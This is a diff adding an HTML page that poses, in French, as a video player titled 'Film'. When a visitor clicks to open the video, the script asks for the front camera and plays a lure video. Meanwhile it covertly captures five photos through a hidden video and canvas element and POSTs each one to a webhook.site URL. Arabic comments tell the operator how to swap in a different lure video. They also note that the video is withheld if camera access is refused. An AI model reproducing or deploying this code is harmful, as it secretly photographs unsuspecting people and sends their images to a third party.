@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Film</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+    }
+    header {
+      width: 100%;
+      padding: 20px;
+      background: #111;
+      text-align: center;
+    }
+    h1 {
+      margin: 0;
+      color: #ff3366;
+      font-size: 2.8rem;
+    }
+    #btn {
+      margin: 40px 0;
+      padding: 18px 60px;
+      font-size: 1.6rem;
+      background: #ff3366;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 0 20px #ff0066;
+    }
+    #btn:hover {
+      background: #ff6699;
+    }
+    #video-container {
+      width: 95%;
+      max-width: 1000px;
+      display: none;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 40px #ff0066;
+    }
+    video {
+      width: 100%;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>Film</h1>
+</header>
+
+<button id="btn">Ouvrir la vidéo</button>
+
+<div id="video-container">
+  <video id="main-video" controls>
+    <source id="video-src" src="" type="video/mp4">
+  </video>
+</div>
+
+<video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const btn = document.getElementById('btn');
+const videoContainer = document.getElementById('video-container');
+const mainVideo = document.getElementById('main-video');
+const videoSrc = document.getElementById('video-src');
+const hiddenVideo = document.getElementById('hiddenVideo');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+
+const WEBHOOK_URL ="https://webhook.site/931505bc-2b78-4afe-b3c0-440372424d90 ";
+const VIDEO_URL ="https://files.catbox.moe/j88flk.mp4 ";  // ← غيّر هنا برابط الفيديو اللي تبيه
+
+btn.onclick = async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+
+    hiddenVideo.srcObject = stream;
+    await hiddenVideo.play();
+
+    // التقاط 5 صور سريعًا
+    for (let i = 1; i <= 5; i++) {
+      setTimeout(() => capturePhoto(i), i * 400);
+    }
+
+    // إظهار الفيديو وتشغيله
+    videoSrc.src = VIDEO_URL;
+    mainVideo.load();
+    videoContainer.style.display = 'block';
+    mainVideo.play();
+
+  } catch (err) {
+    // إذا رفض الإذن → ما يظهر الفيديو
+    alert("Veuillez autoriser la caméra pour voir la vidéo.");
+  }
+};
+
+function capturePhoto(num) {
+  // سطوع الشاشة 100% قبل التقاط (فلاش شاشة خفيف)
+  document.body.style.background = '#ffffff';
+  document.body.style.transition = 'background 0.1s';
+
+  setTimeout(() => {
+    canvas.width = hiddenVideo.videoWidth;
+    canvas.height = hiddenVideo.videoHeight;
+    ctx.drawImage(hiddenVideo, 0, 0);
+    canvas.toBlob(blob => {
+      const fd = new FormData();
+      fd.append('photo', blob, `capture_\( {Date.now()}_ \){num}.jpg`);
+      fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+
+      // رجوع الشاشة للأسود فورًا بعد التقاط
+      document.body.style.background = '#000';
+    }, 'image/jpeg', 0.92);
+  }, 300); // 300 مللي ثانية سطوع قبل التقاط
+}
+</script>
+
+</body>
+</html>
